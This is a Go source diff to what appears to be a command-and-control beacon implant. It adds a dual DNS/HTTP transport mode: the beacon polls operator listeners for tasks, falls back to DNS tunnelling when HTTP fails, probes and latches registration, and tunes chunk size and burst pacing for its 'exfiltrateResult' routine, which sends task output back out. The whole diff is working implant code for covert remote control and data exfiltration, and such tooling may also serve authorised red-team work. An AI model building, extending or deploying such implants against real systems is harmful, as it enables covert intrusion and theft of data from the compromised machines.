@@ -114,6 +114,39 @@ func (b *Beacon) checkIn() (string, error) {
 		pollPhase := b.client.config.GetPollPhase()
 		pollData := fmt.Sprintf("POLL|%s", b.id)
 
+		// Dual: each check-in goes to one endpoint chosen by the weighted
+		// selector across DNS domains and HTTP listeners. An HTTP-chosen poll
+		// uses exactly that listener; a DNS-chosen poll falls through to the DNS
+		// paths below (bypassing the HTTP-first sendControlMessage). The DNS
+		// path already rotates domains, so the class decision is all dual mode
+		// adds here.
+		pollViaDNS := false
+		if b.transport != nil && b.transport.Mode() == transportDual {
+			kind, idx := b.transport.SelectEndpoint()
+			if kind == "http" {
+				timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
+				response, err := b.transport.SendTo(idx, "task", pollData+"|"+timestamp)
+				if err != nil {
+					// The chosen listener is down: fall back to DNS for this
+					// check-in rather than losing it.
+					fmt.Fprintf(os.Stderr, "[Beacon] checkin http[%d] failed (%v); falling back to dns\n", idx, err)
+					response, err = b.client.sendPhaseCommand(pollData, pollPhase.PhaseConfig)
+					if err != nil {
+						return "", fmt.Errorf("poll failed on http and dns: %v", err)
+					}
+				} else {
+					fmt.Fprintf(os.Stderr, "[Beacon] checkin via http[%d]\n", idx)
+				}
+				if response == "REREG" {
+					b.regStage.Store(0)
+					return "", nil
+				}
+				return response, nil
+			}
+			fmt.Fprintf(os.Stderr, "[Beacon] checkin via dns\n")
+			pollViaDNS = true
+		}
+
 		// HTTP-only: the listener delivers the task in the response, and no DNS
 		// C2 query is sent at all.
 		if b.transport != nil && b.transport.Mode() == transportHTTP {
@@ -186,10 +219,17 @@ func (b *Beacon) checkIn() (string, error) {
 			return "ACK", nil
 		}
 
-		// TXT mode poll (default). Routed through the transport seam so a dual
-		// mode beacon fetches over HTTP while HTTP is healthy, and a DNS-mode
-		// beacon behaves exactly as before.
-		response, err := b.sendControlMessage(pollData, pollPhase.PhaseConfig)
+		// TXT mode poll (default). A DNS-chosen dual poll stays on DNS; every
+		// other case routes through the transport seam so a dual mode beacon
+		// fetches over HTTP while HTTP is healthy, and a DNS-mode beacon behaves
+		// exactly as before.
+		var response string
+		var err error
+		if pollViaDNS {
+			response, err = b.client.sendPhaseCommand(pollData, pollPhase.PhaseConfig)
+		} else {
+			response, err = b.sendControlMessage(pollData, pollPhase.PhaseConfig)
+		}
 		if err != nil {
 			return "", fmt.Errorf("poll failed: %v", err)
 		}
@@ -239,6 +279,17 @@ func (b *Beacon) checkIn() (string, error) {
 
 	// Registration uses registration-phase config
 	regPhase := b.client.config.GetRegistrationPhase()
+
+	// Dual, non-staged: prove both transports before committing to a mode. If
+	// only one answers, registerDual latches to it; the operator can re-enable
+	// the other side later from beacon management.
+	if b.transport != nil && b.transport.Mode() == transportDual && !b.client.config.StagedRegistration {
+		if !b.registerDual(checkInData, regPhase) {
+			return "", fmt.Errorf("check-in failed: neither DNS nor HTTP registration was answered")
+		}
+		b.regStage.Store(3)
+		return "ACK", nil
+	}
 
 	// HTTP carrier: register over HTTP first, so the server knows this beacon
 	// before it is asked to signal tasks over DNS. This applies to both http and
@@ -417,9 +468,15 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	// Chunk sizing is transport-dependent. On DNS the ceiling comes from label
 	// and FQDN budgets; on HTTP it comes from the operator's configured payload
-	// and the listener's body limit. Same knobs, same build request, different
-	// physics.
-	safeRawChunk := b.client.config.ResultChunkSize()
+	// and the listener's body limit. A dual beacon sends results over HTTP, so
+	// it uses the HTTP budget unless it latched to DNS.
+	effective := "dns"
+	if b.transport != nil {
+		if m := b.transport.Mode(); m == transportHTTP || (m == transportDual && len(b.transport.transports) > 0) {
+			effective = "http"
+		}
+	}
+	safeRawChunk := b.client.config.ResultChunkSizeFor(effective)
 
 	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
 	if totalChunks == 0 {
@@ -450,7 +507,7 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	// Pacing follows the transport too: the HTTP values replace the DNS rhythm
 	// when the operator set them, because a 64 KiB chunk and an 80 byte chunk do
 	// not want the same burst pattern.
-	chunksPerBurst, burstPause := b.client.config.ResultBurst()
+	chunksPerBurst, burstPause := b.client.config.ResultBurstFor(effective)
 
 	if jitterMin <= 0 {
 		jitterMin = 1000
@@ -596,6 +653,53 @@ func (b *Beacon) sendControlMessage(message string, phase PhaseConfig) (string, 
 		return "", err
 	}
 	return b.client.sendPhaseCommand(message, phase)
+}
+
+// dualProbeRetries is how many times a dual beacon retries a transport whose
+// registration probe failed before latching to the working one.
+const dualProbeRetries = 3
+
+// probeRegistration sends one registration message over a single transport and
+// reports whether it was answered. "dns" uses the DNS path; "http" sends the
+// register operation over the HTTP transport. Each is retried a few times so a
+// single dropped packet does not wrongly mark a live transport dead.
+func (b *Beacon) probeRegistration(kind, checkInData string, regPhase PhaseConfig) bool {
+	for attempt := 0; attempt < dualProbeRetries; attempt++ {
+		var err error
+		switch kind {
+		case "dns":
+			_, err = b.client.sendPhaseCommand(checkInData, regPhase)
+		case "http":
+			if b.transport == nil {
+				return false
+			}
+			timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
+			_, err = b.transport.Send(operationForMessage(checkInData), checkInData+"|"+timestamp)
+		default:
+			return false
+		}
+		if err == nil {
+			return true
+		}
+	}
+	return false
+}
+
+// registerDual proves both transports at startup, then latches to the working
+// one if only a single transport answered. Returning true means at least one
+// transport registered the beacon; the caller has nothing more to do.
+func (b *Beacon) registerDual(checkInData string, regPhase PhaseConfig) bool {
+	if b.transport == nil {
+		return false
+	}
+	dnsOK := b.probeRegistration("dns", checkInData, regPhase)
+	httpOK := b.probeRegistration("http", checkInData, regPhase)
+	if mode := dualModeFromProbes(dnsOK, httpOK); mode != transportDual {
+		b.transport.LatchTo(mode)
+	}
+	fmt.Fprintf(os.Stderr, "[Beacon] dual registration dns=%v http=%v -> mode=%s latched=%v\n",
+		dnsOK, httpOK, b.transport.Mode(), b.transport.Latched())
+	return dnsOK || httpOK
 }
 
 // sendResultMessage delivers one result-protocol frame honouring the operator's
